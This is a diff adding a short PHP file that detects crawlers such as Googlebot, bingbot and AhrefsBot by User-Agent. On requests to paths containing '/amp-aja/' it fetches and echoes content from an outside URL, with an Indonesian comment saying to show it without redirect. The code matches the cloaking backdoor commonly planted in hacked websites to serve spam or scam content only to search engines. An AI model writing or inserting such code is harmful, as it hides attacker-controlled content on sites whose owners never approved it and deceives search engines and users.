@@ -1,0 +1,26 @@
+<?php
+ob_start();
+
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot');
+
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+
+if (is_bot() && strpos($_SERVER['REQUEST_URI'], '/amp-aja/') !== false) {
+    // BOT: Tampilkan konten dari URL ini TANPA redirect
+    $content = file_get_contents('https://ikansalmon.org/r/5960f949/raw');
+    echo $content;
+    exit();
+}
+
+ob_end_flush();
+?>
